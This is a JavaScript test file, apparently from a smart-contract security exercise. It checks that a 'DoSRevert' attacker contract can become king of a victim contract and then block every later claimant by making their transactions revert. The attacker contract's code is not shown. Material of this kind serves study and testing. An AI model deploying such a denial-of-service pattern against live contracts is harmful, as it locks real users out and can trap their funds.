import assertRevert, { assertError } from '../helpers/assertRevert'
import expectThrow from '../helpers/expectThrow'
import { increaseTimeTo, duration } from '../helpers/increaseTime';

const BigNumber = web3.BigNumber

const DoSRevert = artifacts.require('DoSRevert')
const DoSRevertVictim = artifacts.require('DoSRevertVictim')

require('chai')
  .use(require('chai-as-promised'))
  .use(require('chai-bignumber')(BigNumber))
  .should()

const expect = require('chai').expect

contract('DoS Revert Test', accounts => {
  const [creator, user, anotherUser, operator, mallory] = accounts
  const oneEther = 10e18;
  let victim = null
  let attacker = null

  beforeEach(async () => {
    victim = await DoSRevertVictim.new()
    attacker = await DoSRevert.new()
  })

  describe('Victim', () => {
    it('Has a king', async () => {
      const king = await victim.getKing();
      king.should.be.equal(creator);
    })
    it('Sets a new king', async () => {
      await victim.becomeKing({value: oneEther, from: mallory});
    });
    it('Fails if the new king sends too little', async () => {
      await assertRevert(victim.becomeKing({from: mallory}))
    })
  })

  describe('Attacker', () => {
    it('Becomes King', async () => {
      await attacker.becomeKing(victim.address, {value: oneEther * 2});
      const newKing = await victim.getKing();
      newKing.should.be.equal(attacker.address);
    })
    it('The contract is broken', async () => {
      await attacker.becomeKing(victim.address, { value: oneEther * 2 });
      let king = await victim.getKing();
      king.should.be.equal(attacker.address);

      await assertRevert(victim.becomeKing({from: mallory, value: oneEther * 3}));
    })
  })

})

